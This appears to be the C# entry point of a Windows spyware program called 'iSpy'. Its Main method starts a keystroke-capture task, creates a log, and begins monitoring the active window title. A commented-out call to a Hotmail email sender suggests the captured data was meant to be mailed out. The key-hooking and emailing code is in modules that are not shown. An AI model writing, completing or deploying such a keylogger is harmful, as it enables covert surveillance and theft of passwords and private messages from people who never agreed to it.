using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Log;
using Log.Tools;
using WindowCapture;
using KeyCapture;
using System.Windows.Forms;
//using Email;
namespace iSpy
{

    /// <summary>
    /// Main entry point for the iSpy application.
    /// </summary>
    class EntryPoint
    {
        static void Main(string[] args)
        {
            // ***************************************** Send a text email ***************************************************
            // Passed
            ///HotmailEMail.SendEmail();
            //
            // ***************************************************************************************************************


            // Test rules
            // ************************************************************* TEST *******************************************8
            bool result = SetEnvironmentcs.CheckAllRules();

            if (!result)
            {
                Console.WriteLine("No Access to..." + result.ToString());
                Console.ReadLine();
            }
            else
            {
                Console.WriteLine("Access to..." + result.ToString());
                Console.ReadLine();
            }
            // **************************************************************************************************************8

            // 1. Check if a log already ecists.
            if (!LogService.DoesLogExist())
                LogService.CreateNewLog();

            
            // Start keyCapture()
            Task TStartKeyCapture = Task.Run(() => { InterceptKeys.Main();  });

            // Get current active window and start monitoring.
            SetWindowTitle.SetActiveWindowTitle();
            ActivateSpy.StartSpy();

            MessageBox.Show("IS this the VERY end?");

        }
    }
}
